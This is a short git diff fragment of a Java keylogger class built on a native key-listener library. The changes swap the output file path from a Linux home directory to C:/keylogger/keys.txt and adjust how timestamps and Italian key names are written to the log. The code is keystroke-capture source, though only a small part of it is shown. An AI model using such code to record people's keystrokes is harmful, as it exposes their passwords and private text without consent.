@@ -16,15 +16,14 @@ import java.sql.Timestamp;
 import java.util.Date;
 
 /**
- * @author msolivo
+ * @author matteosolivo
  */
 public class KeyLogger implements NativeKeyListener {
 
-	private static final Path file = Paths.get("/home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt");
-	/*
-	LINUX: /home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt
-	WINDOWS: C:/keylogger/keys.txt
-	 */
+	private static final Path file = Paths.get("C:/keylogger/keys.txt");
+	//private static final Path file = Paths.get("/home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt");
+	// WINDOWS: C:/keylogger/keys.txt
+	// LINUX: /home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt
 
 	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 	public static void main(String[] args) {
@@ -71,7 +70,7 @@ public class KeyLogger implements NativeKeyListener {
 
 			if (keyText.length() > 1) {
 				if (keyText.contains("Invio")) {
-					writer.print("\n[" + datetime + "]\n");
+					writer.println("\n[" + datetime.toString() + "]\n");
 				} else if (keyText.contains("Barra spaziatrice")) {
 					writer.print(" ");
 				} else if (keyText.contains("Backspace")) {
